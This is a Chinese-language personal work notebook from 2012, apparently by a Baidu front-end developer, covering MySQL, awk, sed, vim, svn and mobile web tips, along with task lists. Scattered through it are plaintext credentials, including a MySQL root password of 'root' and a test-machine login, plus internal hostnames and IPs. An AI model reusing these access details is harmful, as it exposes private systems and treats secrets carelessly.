2012/11/24
mysql修改数据库默认字符集：
alter database hdm0571 character set = utf8;

查看数据库创建语句：
show create database db_name;
查看存储过程创建语句：
show create procedure pd_name;
2012/11/23
Fedora 16虚拟机上有mysql，root密码为root

258i线上数据库灌数据，使用mysql客户端，1.7w条数据，灌了1.5h。太慢

ALTER TABLE `t_notes` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci

mysql数据库字符集：
create table时可以指定character set
php连接数据库时，使用set Names指定字符集
mysql命令行，指定--default-character-set=utf8
创建数据库时的默认字符集，也可以直接alter。

linux的hosts文件，解决我的虚拟机不能访问百度内网机器的问题。位置：/etc/hosts，修改后立即生效。类似如下：
10.81.43.250 fe.baidu.com
10.26.204.20 tc-apptest-img08.vm.baidu.com
10.81.64.250 db-news-fe2.vm

linux主机建立ssh信任关系：ssh-keygen，一路enter。查看~/.ssh目录，将.pub后缀的key添加到另一台主机的keys文件中。

> grep -I -r $'\xef\xbb\xbf' .  # 查看是否UTF-8 BOM编码的文件，$后面不能用双引号，只能单引号
> grep -I -rP "\xef\xbb\xbf" .  # 功能同上，可用单引号和双引号，-P好用
grep选项：--binary-files=without-match 等同于 -I，作用是跳过二进制文件。-l，仅列出匹配文件名。如果只看是否有匹配，使用-q， --quiet选项。

删除目录下指定类型文件的BOM标记：
find . -type f -iregex ".*\.\(html\|js\|css\)$" | xargs grep -I -l -P "\xef\xbb\xbf" | xargs sed -r -i -e "s/^\xef\xbb\xbf//g;q"
sed命令的q，只输出替换行

windows utf8文件开头的<feff>字符，在vim下删除，vim -b file，二进制打开，可以看到<feff>，删除之即可。该字符可能的问题，会在浏览器里多出空白字符。

vim 正则：
支持前向和后向断言，magic模式。
\@= 前向匹配
\@! 前向不匹配
\@<= 后向匹配
\@<! 后向不匹配
\%^ 文件起始
\%$ 文件末尾
匹配不同进制表示的字符：
\%d... 十进制
\%x.. 十六进制
\%o.. 八进制
\%u.... 多字节字符
\%U.... 大的多字节字符


列出文件或输入流的十六进制表示方式（C风格的数组定义）xxd -i
[work@db-news-fe2.vm.baidu.com build]$ cat deploy.bat | xxd -i
  0x40, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x6f, 0x66, 0x66, 0x0d, 0x0a, 0x73,
  0x65, 0x74, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x0d, 0x0a, 0x73, 0x65, 0x74,
二进制表示方式xxd -b
指定输出多少字节 xxd -b -l 20
纯十六进制输出，不带额外信息 xxd -p

vim十六进制查看和返回文本模式，支持原地十六进制编辑：
:%!xxd
:%!xxd -r
可以直接编辑，然后返回。仅支持原地修改，若要删除前面几行，返回以后会变乱码。

vim的s命令，后面的修饰符支持g，还有i。
:%s/abc/dd/gi

Fedora16修改hosts文件，立即生效。root才有权限修改，格式：ip 主机名

虚拟机不能访问百度内网机器，原因是：

fedora 16 安装subversion客户端：
yum install subversion

我的Linux虚拟机，Fedora 16和RedHat 9以及Ubuntu12
Fedora 16有mysql但是没有svn

mysql远程连接数据库：
mysql -u hdm0571 -p -h hdm0571.gotoftp1.com
-h指定远程主机
mysql -u hdm0571 -p -h hdm0571.gotoftp1.com -D hdm0571
-D直接指定数据库
mysql -u hdm0571 -p -h hdm0571.gotoftp1.com -D hdm0571 -A
-A加快连接速度
2012/11/22
ios下的uc没有无图模式。

toolbar的背景色，莫名其妙出来一个边框。干脆加一个统一背景色。

ctrl+alt+arrow key： 调整屏幕方向。

-webkit-background-size: width height;
将背景图缩放至width宽，height高。

oppo find手机，所有链接都默认带下划线，而且无法去除。
2012/11/21
manifest:
chrome下老出问题

mysql:数据库管理
> reset master
重置所有二进制日志，并将日志文件清空，重新建立新的二进制日志文件。
2012/11/20
JS变量类型：
// 如果是number就不能split了
var keyWords = (keyWord + '').split(/\s\+\s/);

awk命令行，用单引号和双引号的区别：
awk '{print $1}'
awk "{print \$1}"

js正则，ie和其他的区别。&#160;不会被作为ie的空白字符。
// IE doesn't match non-breaking spaces with \s
if ( rnotwhite.test( "\xA0" ) ) {
    trimLeft = /^[\s\xA0]+/;
    trimRight = /[\s\xA0]+$/;
}

awk内建支持的字符串函数：
gensub(r, s, h [, t]) 非原地字符串替换，返回替换后结果
gsub(r, s [, t]) 原地全局替换，返回替换数目
sub(r, s [, t]) 原地单点替换

php和awk以下类似：
php -f php_file
awk -f awk_file
2012/11/19
F1 AE032，领工卡，附近领接线板和网线
F1 CE领电脑
外包接口人：张瑛， 外包上网权限添加：安平平

2012/11/18
mynotes的notes page，计算滚动条位置时：往上不需考虑containerTop，往下需要考虑。因为往上不需要考虑滑动窗口的高度，往下需要考虑滑动窗口的高度。

notes和notes-list页的offsetTop计算方式有差别，主要表现在position:relative标签的设置。

later方法，是GMU对zepto的扩展，还有这些方法：

undefined的模拟：
(function(a, undefined){
  ...
})(1);
2012/11/17
mysql存储过程中，用text代替char(32)，能避免字符串末尾的空格被自动去掉的问题。
2012/11/16
jquery的offset和position都不包含scrollTop。 offset是相对于Viewport左上角的位置。position获取相对于父元素的偏移，事实上是把该元素当绝对定位来处理，获取的是该元素相当于最近的一个拥有绝对或者相对定位的父元素的偏移位置。使用position()方法时如果其所有的父元素都为默认定位（static）方式，则其处理方式和offset()一样，是当前窗口的相对偏移。使用offset()方法不管该元素如何定位，也不管其父元素如何定位，都是获取的该元素相对于当前视口的偏移
http://www.popo4j.com/article/jQuery-absolute-relative-position.html

offsetTop还是自己通过元素属性直接取。
this[0].offsetTop


cms测试机： work@tc-apptest-cms01.tc， 梅花
2012/11/15
shift+a通过fn.toggleClass()，隐藏/显示子元素，不能立即生效。如何触发立即生效？

jQuery的Event，封装了原生事件，用this. originalEvent表示。
fix方法将event对象进行了标准化。

jQuery的fn.height()等同offsetHeight
fn.scrollTop等同scrollTop
没有fn.scrollHeight()

ie6 css attributes hack: _
ie6/7: * 或 #

mysql中separator是关键词。

mysql字符串操作时，下标从1而不是0开始。

mysql:
char(0) 代表空串，用于兼容老字段，但不占空间。

mysql语句：
position(substr in str)
locate(substr, str) 
locate(substr, str, pos)

mysql while语句：
MySQL does not support FOR loops.

[begin_label:] WHILE search_condition DO
    statement_list
END WHILE [end_label]

mysql procedure变量申明和初始化：
DECLARE v1 INT DEFAULT 5;

mysql if语句：
IF search_condition THEN statement_list
    [ELSEIF search_condition THEN statement_list] ...
    [ELSE statement_list]
END IF

2012/11/14
js迅速实现字段截取：
from = (/(\d+)-\d+/.test($(target).text()) ? RegExp.$1 : 1)

js基础技术题：
var a = "10";
console.info(a + 10 - 0);
console.info(a -0 + 10);

百度性能监控平台：
http://mobitest.duapp.com/result/joblist
浏览器繁忙程度监控，setTimeout模拟

前端异常监控，集鹄，讨论中：js异常，资源丢失，html闭合检查，性能异常等

FIS的bingo view方案
后端界面升级，更高端，web页面安装
localstorage存储js，支持增量更新。
缺点：占用localstorage空间

table css样式：
w3c css的styling table可以查阅。还有styling fonts，styling text， styling lists， styling links， styling backgrounds等专题
2012/11/13
awk实现了一套语言，awk语言。awk命令很适合进行格式化输出。

awk program：
awk -f awk_program_file
An AWK program consists of a sequence of pattern-action statements and optional function definitions.
              pattern   { action statements }
              function name(parameter list) { statements }

awk的环境变量AWKPATH
awk的三种变量：VARIABLES, RECORDS AND FIELDS
RECORDS默认为换行符分隔的项
每个RECORD读入时，会被分割成FIELDS

FIELDS的引用，除了 $0, $1, $2, ...，还可以
n = 5
print $n

变量NF表示FIELDS的总个数，该个数可以随意增减

awk是面向行（line-oriented）的语言。

内建变量：
ARGC        The number of command line arguments (does not include options to gawk, or the program source).
ARGIND      The index in ARGV of the current file being processed.
ARGV        Array of command line arguments.  The array is indexed from 0 to ARGC - 1.  Dynamically changing the  contents
           of ARGV can control the files used for data.
BINMODE     On  non-POSIX systems, specifies use of "binary" mode for all file I/O.  Numeric values of 1, 2, or 3, specify
           that input files, output files, or all files, respectively, should use binary I/O.  String values of  "r",  or
           "w"  specify that input files, or output files, respectively, should use binary I/O.  String values of "rw" or
           "wr" specify that all files should use binary I/O.  Any other string value is treated as "rw", but generates a
           warning message.
CONVFMT     The conversion format for numbers, "%.6g", by default.
ENVIRON     An array containing the values of the current environment.  The array is indexed by the environment variables,
           each element being the value of that variable (e.g., ENVIRON["HOME"] might be  /home/arnold).   Changing  this
           array does not affect the environment seen by programs which gawk spawns via redirection or the system() func-
           tion.
ERRNO       If a system error occurs either doing a redirection for getline, during  a  read  for  getline,  or  during  a
           close(),  then  ERRNO will contain a string describing the error.  The value is subject to translation in non-
           English locales.
FIELDWIDTHS A white-space separated list of fieldwidths.  When set, gawk parses the input  into  fields  of  fixed  width,
           instead of using the value of the FS variable as the field separator.
FILENAME    The  name  of the current input file.  If no files are specified on the command line, the value of FILENAME is
           "-".  However, FILENAME is undefined inside the BEGIN block (unless set by getline).
FNR         The input record number in the current input file.
FS          The input field separator, a space by default.  See Fields, above.
IGNORECASE  Controls the case-sensitivity of all regular expression and string operations.  If IGNORECASE has  a  non-zero
           value,  then string comparisons and pattern matching in rules, field splitting with FS, record separating with
           RS, regular expression matching with ~ and !~, and the gensub(), gsub(), index(), match(), split(), and  sub()
           built-in  functions all ignore case when doing regular expression operations.  NOTE: Array subscripting is not
           affected.  However, the asort() and asorti() functions are affected.
           Thus, if IGNORECASE is not equal to zero, /aB/ matches all of the strings "ab", "aB", "Ab", and "AB".  As with
           all  AWK  variables,  the initial value of IGNORECASE is zero, so all regular expression and string operations
           are normally case-sensitive.  Under Unix, the full ISO 8859-1 Latin-1 character  set  is  used  when  ignoring
           case.
LINT        Provides  dynamic  control of the --lint option from within an AWK program.  When true, gawk prints lint warn-
           ings. When false, it does not.  When assigned the string value "fatal", lint  warnings  become  fatal  errors,
           exactly like --lint=fatal.  Any other true value just prints warnings.
NF          The number of fields in the current input record.
NR          The total number of input records seen so far.
OFMT        The output format for numbers, "%.6g", by default.
OFS         The output field separator, a space by default.
ORS         The output record separator, by default a newline.
PROCINFO    The  elements  of  this  array  provide access to information about the running AWK program.  On some systems,
           there may be elements in the array, "group1" through "groupn" for some n, which is the number of supplementary
           groups  that  the  process  has.   Use the in operator to test for these elements.  The following elements are
           guaranteed to be available:
           PROCINFO["egid"]   the value of the getegid(2) system call.
           PROCINFO["euid"]   the value of the geteuid(2) system call.
           PROCINFO["FS"]     "FS" if field splitting with FS is in effect, or  "FIELDWIDTHS"  if  field  splitting  with
                              FIELDWIDTHS is in effect.
           PROCINFO["gid"]    the value of the getgid(2) system call.
           PROCINFO["pgrpid"] the process group ID of the current process.
           PROCINFO["pid"]    the process ID of the current process.
           PROCINFO["ppid"]   the parent process ID of the current process.
           PROCINFO["uid"]    the value of the getuid(2) system call.
RS          The input record separator, by default a newline.
RT          The record terminator.  Gawk sets RT to the input text that matched the character or regular expression speci-
           fied by RS.
RSTART      The index of the first character matched by match(); 0 if no match.   (This  implies  that  character  indices
           start at one.)
RLENGTH     The length of the string matched by match(); -1 if no match.
SUBSEP      The character used to separate multiple subscripts in array elements, by default "\034".
TEXTDOMAIN  The text domain of the AWK program; used to find the localized translations for the program's strings.

内建变量使用，没有$：
print FNR

awk的数组，都是关联数组。
if (val in array)
print array[val]

变量类型和转换：

八进制与十六进制数：011, 0x11

字符串常量：
\\, \a, \b, \f, \n, \r, \t, \v, \xhex, \ddd, \c

awk注释用#

同一行内的语句可用;分隔


Patterns and Actions:
Pattern可以如下：
              BEGIN
              END
              /regular expression/
              relational expression
              pattern && pattern
              pattern || pattern
              pattern ? pattern : pattern
              (pattern)
              ! pattern
              pattern1, pattern2

BEGIN和END是两个特殊pattern，所有这些模式的action会被分别合并，BEGIN对应的Action会在input之前执行，END对应的会在input之后执行。

awk的正则：
. 任意字符，包含换行
^, $, [, ], (, ), {, }, \w, \W同perl正则
\y 单词前或单词后的空字符串
\B 单词中的空字符串
\< 单词开始
\> 单词结束

awk字符类比较特殊，以[:开头，:]结尾。
[:alnum:]
[:alpha:], [:space:]等

awk 的actions：
包含在{, }之间。
其内的语句包含通常语言都有的赋值，条件和循环语句。

awk action的操作符优先级：

awk action的控制流语句：
    if (condition) statement [ else statement ]
    while (condition) statement
    do statement while (condition)
    for (expr1; expr2; expr3) statement
    for (var in array) statement
    break
    continue
    delete array[index]
    delete array
    exit [ expression ]
    { statements }

I/O 语句：
close(file)
getline
next
nextfile
print expr-list
printf fmt,expr-list
system(cmd-line)
fflush(file) 

数学函数：
atan2(y, x)
cos(expr)
exp(expr)
int(expr)
log(expr)
rand(expr)
sin(expr)
sqrt(expr)
srand(expr)

字符串函数：
一堆，man awk查看

时间函数：

位操作函数：




grep -Po "\"title\":\"[^\"]*\",\"url\":\"[^\"]*\",\"imgh_url\":\"[^\"]*\"" movie_1.json > movie.out  

还存在不能理解框架的情况，比如pagechange事件，整体类图，有哪些属性，之间怎么关联都不清楚。

这也导致没有按规范的MVC来进行开发。

localStorage的key，不要太通用
localStorage.nav

android：添加记录位置的功能，张楠
第二次上拉刷新不生效

技术能力
积极学习
工作态度
软素质
氛围调动
2012/11/12
android下，css3高级特性少用，特别是shadow：text-shadow, box-shadow等

字符串拼接：php是., js是+

news webapp 自动化测试：
http://yx-testing-news21.yx01.baidu.com:8091/news

2012/11/11
vim的:update命令，简称up，和write类似，不过其仅在缓冲区修改以后才会写入。
比如修改文件编码：
:set fenc=utf-8 | up

mysql CASE Syntax:
CASE case_value
    WHEN when_value THEN statement_list
    [WHEN when_value THEN statement_list] ...
    [ELSE statement_list]
END CASE
Or:
CASE
    WHEN search_condition THEN statement_list
    [WHEN search_condition THEN statement_list] ...
    [ELSE statement_list]
END CASE
The CASE statement for stored programs implements a complex conditional construct.

2012/11/10
js为啥eval不了：
json_encode(array(‘rows’ => $rows, ‘rows_with_context’ => $rows_with_context))
而以下却可以：
json_encode(array($rows, $rows_with_context))

双引号括起来的选项，在shell命令行中，需要做两次转义，单引号不需要。双引号中，特殊的地方是斜线需要写成四个，\\\\。
比如：
grep -P "\\\\" a.txt
sed -r -e "s/\\\\/_\\0_/g" a.txt
grep -P '\\' a.txt

sed的字符类内部，可以省掉不少转义，比如(,),$,|等都不再有特殊含义。
sed -r -e "s/['\"()<>\\]/\\\\\0/g"

linux shell：
for i in 1 2 3 4 5; do echo $i; done
for i in *.sh; do echo $i; done

linux shell有分号，windows shell没有分号

vim大小写：
{Visual}u 选中内容lowercase
{Visual}U 选中内容UPPERCASE
{Visual}~ 选中内容大小写反转
gu{motion} 移动操作部分转小写
g~{motion} 移动操作部分大小写反转
gU{motion} 移动操作部分转大写
guu 当前行转小写
gUU 当前行转大写
g~~ 当前行大小写反转

要让电脑发声，独辟蹊径的方式，找个svn repos，运行： svnadmin dump repos_path

校验完整性：
E:\svnserver\repos>for /d %i in (*) do svnadmin verify %i

掌握svn常用co，up，ci之外，还需要掌握备份与还原。
svn的备份与还原：
http://magnet2008.iteye.com/blog/586578
http://www.cnblogs.com/itech/archive/2011/10/11/2206988.html

svn备份：
svnadmin dump repos_path dist_dump_file
svn恢复：
svnadmin load dump_file repos_path
查看完整性：
svnadmin verify repos_path

svnlook info repos_path
查看版本库信息，注意是文件路径，而不是URL
svnlook youngest repos_path
查看最新版本

news没有用fis，其他产品线基本用上了
首页大小，太多空白，news首页能减少130k的空间。只用以下替换的情况：
:%s/[ \t]\{2,\}/ /g
130K的空白字符，考虑gzip，至少能省10k，按首页1000w pv算，一天1亿k，也就是10w M，也就是100G。


2012/11/9
ie支持hidefocus，去除a标签默认的点击后虚框；
<a href=”#” hidefocus>...</a>
其他浏览器支持的css outline属性，css2，默认为none，也可去除虚框

Apache：
RewriteRule pattern replacement
pattern支持PERL正则表达式，pattern只针对path进行匹配。
反向引用支持$0

Apache Rewrite 正则：
http://httpd.apache.org/docs/2.2/en/rewrite/intro.html#regex

2012/11/8
video：

高端～～
我的文本检索：http://hudamin.fe.baidu.com/notes/notes.html
1. 创建.sql文件
2. 灌数据
3. 建存储过程


PHP里的正则：
PCRE： preg_前缀
POSIX： ereg_前缀

js权威指南，part III，对core函数的解析值得一看。

js String.replace(pattern, replacement)，反向引用没有$0，只从$1开始，匹配整个pattern的反向引用使用$&
php的perl_系函数，反向引用同时支持 $0 和 \0。
apache 的rewriete，支持$0
sed的s命令，支持 \0 和 &，但不支持 \&
vim的:s同sed的s

mysql的字符串函数instr(str, substr)，返回index，不存在返回0，存在返回1..n

jquery实现htmlencode：
function escapeHTML(str){
    if($('#_text_holder').length == 0){                                                                                     
        $('body').append($('<div id="_text_holder"></div>').hide());
    }
    return $('#_text_holder').text(str).html();
}


2012/11/6
angularjs: http://angularjs.org/
webapp framework, MVC

wpp的php环境需要pear的安装，特别是windows下，需要go_pear.bat一下。
Hudson svn最好配置一个用户，不要依赖shell环境的用户。

php调用MySQL存储过程方法集合
http://blog.csdn.net/abandonship/article/details/6653668

存储过程多结果集输出的方式，需要用mysqli方式才能获取到，mysql无法获取到。

sql，正则查询：
select text from t_notes where id in (select id from t_notes where text REGEXP '^for');
select ... into，可以将查询结果按格式输出，比如导出成csv文件等。

mysql创建临时表：
create temporary table tmp_tab select id, text from t_notes;

mysql函数：
abs(), floor(), ...

mysql存储过程：
创建：
查看细节：show create procedure dbname.procname;

awk的字符类，以[:开头，:]结尾，比较特殊。
[:alnum:]，字母数字类
[:digit:]，数字类
actions包含在{}中间。
printf fmt,expr-list
print expr-list

cat note_20121106.txt | sed -r -e 's/\\/\\/g' | sed -r -e "s/[\'\\\"]/\\\\\0/g" > output.txt
cat output.txt | xargs --replace=_line echo "\"_line\"" > line.txt

按行生成字符串，用于灌数据库：
cat note_20121106.txt | sed -r -e 's/\\/\\/g' | sed -r -e "s/[\'\\\"]/\\\\\0/g" | grep -Pv "^$" | sed -r -e 's/^|$/"/g' > output.txt
以上对于中文支持不好。
换成以下：
cat note_20121106.txt | sed -r -e 's/\\/\\\\/g' | sed -r -e "s/[\'\\\"]/\\\\\0/g" | grep -Pv "^$" | awk '{printf "\"%s\"\n", $0}' > output.txt

生成sql：
cat note_20121106.txt | sed -r -e 's/\\/\\\\/g' | sed -r -e "s/[\'\\\"\\\(\\\)\\\<\\\>]/\\\\\0/g" | grep -Pv "^$" | awk '{printf "insert into t_notes (tag, time, text) values (\"test\", current_timestamp(),\"%s\" );\n", $0}' > ~/softwares/scripts/output.sql

sed的pattern不用magic模式。

shell之美

virtualBox：
Fedora 16和RedHat 9，该版本的Vbox已经有端口映射功能。
Fedora 16安装了MySql
以上两个，Linux内核比较低

db-ts-test02.vm机器，/home/hudamin
mysql数据库，/home/hudamin/softwares/mysql
> mysql -u root -p -P 3335
>root
相关数据库脚本：/home/hudamin/softwares/scripts
这上面有comments数据库
2012/11/5
:help ‘statusline’
设置状态行的格式，是printf格式。和ruler与laststatus=2有关，用Ctrl+G调出。

ios6.0 的loading bug在6.0.1修复了，不会让你觉得还有东西在loading。

expand函数，用于将特殊字符串解析成字符串返回。
比如expand(“%”)，返回当前文件名。

option grepprg|gp，用于设置外部grep程序：
unix默认：grep -n $* /dev/null
实际运行：:!grep -n abc /dev/null 2>&1| tee /tmp/vjm7vhc/3
黄色部分会自动接上
2012/11/2
iOS默认viewport的width为980px
还有height, user-scalable, initial-scale等，用逗号分隔

说白了，就是在不缩放情况下，你用可视区域来展示多少CSS尺寸的区域。

desktop的viewport就是可视区域，不可见部分通过滚动条来看到。
mobile的viewport决定了内容的展示和文本的wrap，它可能大于或者小于可视区域。

思路：使用inline-block取代float

PHP编译，make完以后，可以make test一下，跑一跑测试用例。比如5.3.5就有9003个测试用例。
zip extension的安装，需要zlib，在configure里用--enable-zip来开启。没有php.ini配置。

chrome发现刷新两次，manifest的文件还没有更新，重启一下chrome即可。
2012/11/1
ie6莫名报脚本错误，还有可能script的charset设置问题。

临时支持的项目：
时间右对齐
添加滚动新闻

video的统计

http://css-tricks.com/css-content/
css content属性，只用在:before, :after伪类中。
#main-content a:visited:before {
   content:  "\2713 ";
}
CSS unicode字符，斜线开头，后接4个hex字符。
JS unicode字符，\u开头，后接4个hex字符。
HTML entity字符，&#开头，后接十进制字符。


apache设置Alias，如果403，forbidden，可能是Directory没有设置相应访问权限，也有可能是对应目录根本不存在或权限不够。

localstorage是跟host走的？
可能有隐私模式，就不启动localstorage
会不会把m.baidu.com这个host充满

:help [range]
或者 :help cmdline-ranges

:1,$s/x/X/g
:%s/x/X/g
:s/x/X/g 5
:.+5s/x/X/g
:23d 4

2012/10/31
js函数运行在其所定义的上下文。

2012/10/30
没考虑bdtopic，bdhao123, bdapifocus, bdapiclass, bdtc
       571    1488      2505     895       4041

考虑： bdapibody, bdapiindex, bdapilist, bdapirecommend, bdapitext,  bdapisearch, bdindex
数据模板请求的uid： 311055
bdindex首页模板请求的uid： 273600
按理数据模板请求的UID就是整体UID，把数据模板和bdindex合并去重后，不会超过数据模板的uid总数，但结果却是： 393489，多出来将近8w。
解释为bdindex访问以后，再进行bdapixxx模板的数据请求，会导致使用新uid，该新uid可能是新生成的。所以将两者合并起来统计，会使uid重复统计。

加了manifest以后，为啥bdindex的访问量还那么多？
首页的请求URL千差万别，不固定，比如http://m.baidu.com/news，通常后面都带一长串查询参数，导致首页总会重新请求。

结论：bdindex的uid和bdapiindex的uid并不吻合，两者单独uid均为27w，但合并后uid为37w

manifest：
http://m.baidu.com/news
与http://m.baidu.com/news?cip=61%2E135%2E186%2E44&pu=sz%401320_480&fr=iphone_kuaisou&uid=C763F58B0425BB7989D940F38E3853F0&ssid=0&bd_page_type=1&bd_req_type=3&from=0&logid=9314256072048072491
会用同样的manifest，缓存的静态文件仍然生效。只是Master重新下载
首页的cache大概20%生效。50w的bdapiindex和40w的bdindex

周二android文字链

周三news ios优化完毕
周四news android，video android启动，争取下周上线

webapp，以及news pc的周报

查找文件，剔除某些不需满足的条件，-not：
find . -type f -not -iregex '.*\.svn/.*\|.*\.jpg\|.*\.png\|.*\.gif'
2012/10/29
sh -x grep_action.sh log_20121028/ output_20121028/ '-Po \[wise_uid:[^\]]+\]' uid
飘黄部分不能添加双引号

echo abc/defg.2012.log | grep -Po "/[^/]+$"
会报错，出Segmentation Fault，改成：
echo abc/defg.2012.log | grep -Po "/[a-z0-9\.]+$"
OK，问题出现在^，不用这个就没事儿。有点奇怪。

xargs 不支持for命令

find [path...] [expression]
expression由options(全局)、tests以及actions组成。expression有operators分割。默认为-and，也即逻辑与。operator还有(), !, -not, -a, -and, -o, -or, ‘,’

find也可以跳过某些目录，使用-path test和-prune action：
find . -path './src/emacs' -prune -o -print

-regex的正则同vim正则，是针对整个path，而不是部分。
find . -regex '^\./\(webapp\|vs\|news\).*' -prune -o -print
-o分隔，不是prune就是print

vim substitute
: %s/class=\([^&]\+\)&pn=1" class="more" target="_blank"/\0 mon="c=\1\&col=23"/g
\&与不加\是有区别的，说白了，就是&需要转义。&在替换字符串里的含义与\0一样，是整个匹配字符串。
:help sub-replace-special
可以查看相关内容，或者先:help substitute
替换字符串：\u, \U转大写， \l, \L转小写， \=支持表达式， \r表示<CR>分行，\n表示NUL字符。

vim global
:g[!]/pattern/Ex command
:g/<link\|<script/
列出所有link和script标签行
2012/10/26
svn import命令：
svn import dquery_statistic/ http://tc-apptest-img08.vm.baidu.com:8021/svn/repos/projects/dquery_statistic/ -m "add dquery_statistic by damin"
把dquery_statistic目录下的所有内容添加到仓库中dquery_statistic目录下，如果该目录不存在，会自动创建。要-m参数，弄好后，再co出来。

webapp:
首页频道调整
Hao123
反馈入口干掉
百搜留白问题


2012/10/25
shell脚本，先替换再运行。

fe1机器上，/c_n服务，相关配置项：/home/work/newsphp/newsroot/conf/mcpack.ini
[npscm]
Enable = 1;
ServerIP = 10.26.103.36; // 后端IP
ServerPort = 4000;      // 后端端口
ConnectTimeOut = 1;     // 连接超时
RWTimeOut_Sec = 1;      // 读写超时 秒  
RWTimeOut_MSec = 500;   // 读写超时 毫秒  

[houyi]
Enable = 1;
ServerIP = 10.26.103.36; // 后端IP
ServerPort = 4000;      // 后端端口
ConnectTimeOut = 1;     // 连接超时
RWTimeOut_Sec = 1;      // 读写超时 秒  
RWTimeOut_MSec = 500;   // 读写超时 毫秒  
可以直连线上机器，不需白名单
用于线下测试个性化。


ps -ef 
ps -d 701
ps -aux
killall -9 httpd，没办法的杀法
最好有个httpd.pid文件

Chrome插件：Manage Stored Cookies
修改Cookie的工具


判断首页数据模板，哪些字段是没有使用的？
for i in `cat fields.lst`; do grep $i all_data.lst; if [ 0 != $? ]; then echo "nomatch: $i"; fi; done | grep nomatch


passport修改
娱乐频道导航栏对齐


vim： --cmd可以设置fencs，影响文件读取； -c可以设置enc和tenc，影响文件读取后的显示和操作。set操作可以一次弄多个，set enc=utf-8 tenc=gb2312
2012/10/24
如何安装java环境？
gij和java
可以自己安装一个jre，不受root权限影响：jre-6u30-linux-i586.bin
work@db-news-fe2.vm:/home/work/softwares/java

yui的--type参数是js而不是javascript

JSONLint: http://jsonlint.com/
JSON的validator

CMS手工编辑栏目后面的注释与填内容时的标签名称没有一一对应的关系。建议删除。
国内图片挤下来了，首屏，先不管



女人图片墙

专题CMS化

导航栏对齐：
当前分类的加粗会导致导航栏左右跳动，会影响稳定性
房产页多了margin-top
娱乐频道没有刷新功能。娱乐页的广告位没有撤。

double margin： display inline，或者使用padding代替margin
tangram 1.x版本，baidu.dom.show与baidu.dom.hide有bug，ie下有
2012/10/23
./newsroot/temp/eacc/7/5/eaccelerator-1502.24386062
eacc可以清理掉

cd apache2
find . -type f | grep -vP "\.jpg$|\.so$|^\.\/(cache\.dir|htdocs|icons|manual|man|include|lib|logs)" | xargs grep -P "\/newsphp" | grep -Pv "^Binary file" | awk -F ':' '{print $1}' | sort | uniq | xargs sed -i -r -e 's/\/newsphp\//\/newsphp_hdm\//g'
htdocs/newsphp.php
cd newsroot
grep -rP "\/newsphp\/" . | awk -F ":" '{print $1}' | sort | uniq | xargs sed -i -r -e 's/\/newsphp\//\/newsphp_hdm\//g'
shell/cp.sh

- mime: .apk application/vnd.android.package-archive
下次升级app.news.baidu.com 的时候，找我一下啊，要加这样一行
from hongji

iOS6 app推广
http://www.36kr.com/p/155243.html

现在的第三条的错误有：a=2，pn参数没有；
应该改为a=1&pn=3
请大民安排高优先级修改，谢谢

app页面添加统计，接口人王倩。优先级高，明天搞定。李嘉源

广告添加项目，明天开始，最快本周，晚点下周

齐家那边要改标签名 ，不急，附带搞完即可
http://fangchan.news.baidu.com/?loc=0
http://news.baidu.com/n?cmd=1&class=homeinfo&pn=1&from=tab
家居风水->装修户型
 施工验收-> 空间布置
2012/10/22

VIDEO，Webapp在iOS6上header会消失的bug

Hunter 1.6发布了：http://hunter.baidu.com
无线端多页面还原

要主动，激进点

人力不够：
news： webapp 3人， PC 1人
video：webapp 3人

先看优先级，如果都要做，那就人力不够了。

iOS6更新：
本更新包含超过 200 项新功能，其中包括：

•  地图
◦  Apple 设计的基于矢量的地图
◦  在 iPhone 5、iPhone 4S、iPad WLAN + Cellular（第 2 代和第 3 代）上实现带语音提示的路线规划导航
◦  实时交通路况信息
◦  Flyover 在 iPhone 5、iPhone 4S、iPad（第 3 代）和 iPod touch（第 5 代）上将主要城市区域以照片般真实的互动式 3D 视图呈现
◦  本地搜索结果附带 Yelp 照片、评分、评论和优惠信息
◦  Siri 集成到获取路线和查找沿线地点的功能中
•  Siri 改进
◦  运动：棒球、篮球、橄榄球、足球和冰球比赛的比分、球员技术统计、赛程、球队阵容和联赛排名
◦  影片：预告片、上映排期、评论和剧情介绍
◦  餐馆：预订、评论、照片等信息
◦  发送推文
◦  发布在 Facebook 上
◦  启动应用程序
◦  在支持的车型上实现免视导航 (Eyes Free)
◦  支持 Siri 的国家/地区都可以使用本地搜索功能（推出初期，可用性可能受限制）
◦  更多国家/地区及语言支持：加拿大（英语和加拿大法语）、中国（普通话）、香港（粤语）、意大利（意大利语）、韩国（韩语）、墨西哥（西班牙语）、西班牙（西班牙语）、瑞士（意大利语、法语和德语）、台湾（国语）以及美国（西班牙语）
◦  支持 iPhone 5、iPhone 4S、iPad（第 3 代）和 iPod touch（第 5 代）
•  Facebook 集成
◦  在“设置”中单次登录
◦  从“照片”、Safari、“地图”、App Store、iTunes、Game Center、“通知中心”和 Siri 直接发布
◦  给任意发布添加位置信息和选择观众
◦  在“通讯录”中查看最新的 Facebook 个人主页照片和联系人信息
◦  在“日历”中查看 Facebook 事件和生日提醒
◦  称“赞”内容和查看朋友们在 App Store 和 iTunes Store 中称“赞”的内容
•  共享的照片流
◦  将选定照片共享给您选择的人
◦  朋友们可以在“照片”应用程序、iPhoto 和 Apple TV 中查看共享的照片
◦  朋友们可以称“赞”并给单独的照片添加评论
•  Passbook
◦  集中管理登机牌、购物卡、电影票和其他凭证
◦  以条形码显示用于登机、购买咖啡、去影院看电影等活动的凭证
◦  凭证会根据时间或位置显示在锁定屏幕上
◦  凭证可自动更新
◦  支持 iPhone 和 iPod touch
•  FaceTime 改进
◦  iPhone 5、iPhone 4S 和 iPad WLAN + Cellular（第 3 代）支持通过蜂窝移动网络进行 FaceTime 通话
◦  在 iPad 和 iPod touch 上接收拨给您的 iPhone 号码的 FaceTime 呼叫
•  电话改进
◦  “勿扰模式”可让您免受来电和通知的打扰
◦  拒绝来电时提供“以信息回复”选项
◦  拒绝来电时根据时间或位置提供“稍后提醒我”选项
•  邮件改进
◦  VIP 邮箱可让您快速找到重要人士的邮件
◦  有旗标电子邮件的专用邮箱
◦  编写电子邮件时可插入照片和视频
◦  打开受密码保护的 Office 文稿
◦  下拉即可刷新邮箱
◦  各个帐户独有签名
•  Safari 改进
◦  iCloud 标签可看到您所有设备上打开的页面
◦  离线阅读列表
◦  照片上传支持
◦  在 iPhone 和 iPod touch 上支持全屏幕横排视图
◦  智能应用程序横幅
◦  JavaScript 性能提升
•  App Store 和 iTunes Store 改进
